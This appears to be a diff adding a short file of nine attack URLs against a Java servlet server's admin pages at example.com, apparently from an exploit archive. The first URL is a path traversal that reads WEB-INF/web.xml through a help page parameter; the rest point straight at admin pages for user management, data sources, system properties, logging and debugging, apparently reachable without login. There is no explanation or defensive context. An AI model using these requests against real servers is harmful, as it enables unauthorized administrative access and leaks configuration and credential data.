@@ -1,0 +1,9 @@
+http://www.example.com/servlet/pagecompile._admin._help._helpContent_xjsp?page=../../WEB-INF/web.xml
+http://www.example.com/servlet/pagecompile._admin._login_xjsp
+http://www.example.com/servlet/pagecompile._admin._vmSystemProperties_xjsp
+http://www.example.com/servlet/pagecompile._admin._SELogging_xjsp
+http://www.example.com/servlet/pagecompile._admin._userMgt_xjsp
+http://www.example.com/servlet/pagecompile._admin._virtualServers_xjsp
+http://www.example.com/servlet/pagecompile._admin._optionalPackages_xjsp
+http://www.example.com/servlet/pagecompile._admin._dataSources_xjsp
+http://www.example.com/servlet/pagecompile._admin._debug_xjsp
